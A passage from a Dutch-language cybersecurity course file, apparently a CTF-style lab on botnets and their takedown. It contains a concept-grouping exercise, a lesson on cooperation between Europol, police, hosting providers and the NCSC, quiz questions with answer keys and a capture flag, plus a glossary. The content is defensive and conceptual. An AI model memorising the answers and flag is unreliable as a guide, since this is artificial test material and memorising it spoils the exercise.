        title: 'Botnet & takedown — zestien begrippen',
        prompt: 'Sleep de zestien begrippen in vier groepen van vier. Elk begrip hoort bij precies één categorie.',
        flag: 'JVT{zestien_op_een_rij}',
        groups: [
          { name: 'Onderdelen van een botnet', items: ['Bot (zombie)', 'Loader', 'C2-server', 'Botherder (operator)'] },
          { name: 'C2-kanalen & -technieken', items: ['HTTP-beaconing', 'DGA', 'Fast-flux DNS', 'IRC-kanaal'] },
          { name: 'Acties bij een takedown', items: ['Sinkholing', 'Inbeslagname (seize)', 'Domein-overname', 'Slachtoffernotificatie'] },
          { name: 'Partners bij een takedown', items: ['Europol', 'NCSC', 'Hostingprovider', 'Rechter-commissaris'] },
        ],
      },
      questions: [
        { q: 'In welke categorie hoort "Sinkholing"?', options: ['Acties bij een takedown', 'Onderdelen van een botnet', 'C2-kanalen & -technieken', 'Partners bij een takedown'], answer: 0, explain: 'Sinkholing is iets wat opsporing dóét om het botnet te verstoren — een takedown-actie, geen kanaal van de bot.' },
        { q: 'Welk begrip is een C2-kanaal/-techniek en geen onderdeel of takedown-actie?', options: ['Fast-flux DNS', 'Loader', 'Inbeslagname', 'Europol'], answer: 0, explain: 'Fast-flux DNS wisselt razendsnel van IP om de C2 moeilijk te blokkeren — een C2-techniek. Een loader is een botnet-onderdeel, inbeslagname een actie en Europol een partner.' },
        { q: 'Welke vlag verschijnt als alle vier de groepen kloppen?', answer: ['JVT{zestien_op_een_rij}'], hint: 'Verschijnt in het connections-lab bij vier goede groepen.', explain: 'Vier correcte groepen van vier leveren JVT{zestien_op_een_rij} op.' },
      ],
    },

    {
      title: 'Taak 7 — Opsporing, partners en de nazorg',
      content: `
        <p>Een botnet-takedown is nooit het werk van één partij. Juist omdat bots, C2-servers, operators en slachtoffers
        over de hele wereld verspreid zitten, draait alles om <strong>samenwerking</strong>. We sluiten de casus af met de
        vraag: wie doet wat, en wat gebeurt er ná de klap?</p>

        <h3>Wie werkt mee?</h3>
        <ul>
          <li><strong>Europol</strong> (met het EC3, het European Cybercrime Centre) en <strong>Eurojust</strong>
          coördineren internationale acties: ze brengen politiediensten uit meerdere landen samen en regelen de
          rechtshulp die nodig is om servers in het buitenland in beslag te nemen.</li>
          <li>De <strong>Politie</strong> (in Nederland het Team High Tech Crime) en het <strong>Openbaar Ministerie</strong>
          doen het opsporingswerk en leveren de juridische basis (officier van justitie, rechter-commissaris).</li>
          <li><strong>Hostingproviders en domeinregistrars</strong> zijn onmisbaar: zij voeren de sinkhole en de
          inbeslagname technisch uit op hun eigen infrastructuur.</li>
          <li>Het <strong>NCSC</strong> (Nationaal Cyber Security Centrum) en sectorale CERT's verspreiden de lijst met
          besmette IP-adressen en waarschuwen de getroffen organisaties. Ook private securitybedrijven leveren vaak
          analyses en sinkhole-capaciteit.</li>
        </ul>

        <h3>Sinkholing en notificatie: het stille werk</h3>
        <p>Het spectaculaire moment is de seize, maar de echte winst zit in de <strong>sinkhole</strong> daarna. Zolang die
        draait, checken besmette machines in bij een onschadelijke server in plaats van bij de operator. Elk inkomend
        IP-adres is een <strong>slachtoffer dat gewaarschuwd kan worden</strong>. Via het NCSC en de CERT's krijgen
        bedrijven en burgers bericht: "jouw apparaat is besmet, schoon het op". Soms gebeurt dat via de
        internetprovider. Zonder deze notificatie zou het botnet technisch dood zijn, maar zouden de bots besmet blijven.</p>

        <h3>En daarna?</h3>
        <p>Een takedown is zelden het definitieve einde. Operators proberen soms een nieuw botnet op te bouwen, dus
        monitoren blijft nodig. En naast <em>verstoren</em> bestaan er andere interventies: strafrechtelijk vervolgen,
        preventie, of een alternatief traject voor jonge first-offenders. Het sterkst is vaak de combinatie: de
        infrastructuur verstoren én de mensen erachter aanpakken én de slachtoffers helpen.</p>

        <div class="callout info">
          <strong>Melden loont:</strong> gratis decryptie- en opschoontools worden gebundeld in publiek-private
          initiatieven, en wie zelf slachtoffer is, kan terecht bij de Politie en het NCSC. Hoe meer organisaties hun
          waarnemingen delen, hoe sneller het volgende botnet in kaart is.
        </div>

        <p>Goed gedaan: je hebt de casus SchimNet van één besmette pc tot een gecoördineerde takedown doorlopen — met
        pcap-analyse, ATT&amp;CK-mapping, een infrastructuur-pivot en de vaste stappen van een operatie.</p>
      `,
      questions: [
        { q: 'Welke Europese organisatie coördineert internationale cybercrime-takedowns en brengt politiediensten samen?', answer: ['Europol', 'europol'], hint: 'Met het EC3, het European Cybercrime Centre.', explain: 'Europol (met Eurojust voor de rechtshulp) coördineert operaties zoals Endgame tussen meerdere landen.' },
        { q: 'Waarom is de sinkhole ná de seize zo belangrijk voor de slachtoffers?', options: ['Elk IP-adres dat incheckt is een besmette machine die gewaarschuwd kan worden', 'Omdat de operator dan zijn geld terugkrijgt', 'Omdat de bots er sneller van worden', 'Dat is helemaal niet belangrijk'], answer: 0, explain: 'De sinkhole vangt de check-ins op; die IP-lijst gaat via NCSC en CERT\'s naar de getroffenen zodat zij kunnen opschonen.' },
        { q: 'Welke Nederlandse organisatie verspreidt de lijst met besmette IP-adressen en waarschuwt getroffen organisaties?', answer: ['NCSC', 'ncsc', 'nationaal cyber security centrum'], hint: 'Het Nationaal Cyber Security Centrum.', explain: 'Het NCSC en sectorale CERT\'s zorgen voor de slachtoffernotificatie na een takedown.' },
        { q: 'Ik begrijp dat een takedown samenwerking vraagt (opsporing, Europol, hostingproviders, NCSC) en dat de notificatie van slachtoffers onmisbaar is.', noAnswer: true },
      ],
    },
  ],
  terms: [
    { term: 'Botnet', def: 'Een netwerk van gekaapte computers (bots) die centraal worden aangestuurd door één operator.' },
    { term: 'Bot (zombie)', def: 'Eén besmette computer die stiekem opdrachten van de operator uitvoert.' },
    { term: 'Loader (dropper)', def: 'Het eerste kleine stukje malware dat binnenkomt en vervolgens de echte botmodule ophaalt en installeert.' },
    { term: 'C2 (command-and-control)', def: 'De centrale server waarmee bots contact houden om opdrachten op te halen en buit af te leveren.' },
    { term: 'Operator (botherder)', def: 'De crimineel of groep die het botnet beheert, aanstuurt en vaak verhuurt.' },
    { term: 'Beaconing', def: 'Het regelmatig "inchecken" van een bot bij zijn C2; herkenbaar aan een vast interval en vaste pakketgrootte.' },
    { term: 'DGA (domain generation algorithm)', def: 'Algoritme dat elke dag veel willekeurige domeinnamen genereert, zodat de C2 niet met één blokkade te stoppen is.' },
    { term: 'Fast-flux DNS', def: 'Techniek waarbij een domein razendsnel van IP-adres wisselt om de C2-infrastructuur moeilijk te blokkeren.' },
    { term: 'Sinkholing', def: 'Het C2-domein overnemen en naar een onschadelijke, gecontroleerde server wijzen; de bots checken in maar krijgen geen opdrachten.' },
    { term: 'Takedown', def: 'Een gecoördineerde actie om een botnet te verstoren: identificeren, in kaart brengen, juridische basis, sinkholen/seizen en slachtoffers notificeren.' },
    { term: 'Seize (inbeslagname)', def: 'Het juridisch in beslag nemen van de C2-servers en infrastructuur, meestal gelijktijdig met de sinkhole.' },
    { term: 'Slachtoffernotificatie', def: 'De getroffen organisaties waarschuwen met de besmette IP-adressen uit de sinkhole, via NCSC en CERT\'s.' },
  ],
  resources: [
    { title: 'Europol — operaties tegen malware en botnets', url: 'https://www.europol.europa.eu/' },
    { title: 'MITRE ATT&CK — technieken en tactieken', url: 'https://attack.mitre.org/' },
    { title: 'abuse.ch — trackers voor botnet-C2 (o.a. Feodo Tracker)', url: 'https://abuse.ch/' },
    { title: 'NCSC — Nationaal Cyber Security Centrum', url: 'https://www.ncsc.nl/' },
  ],
});
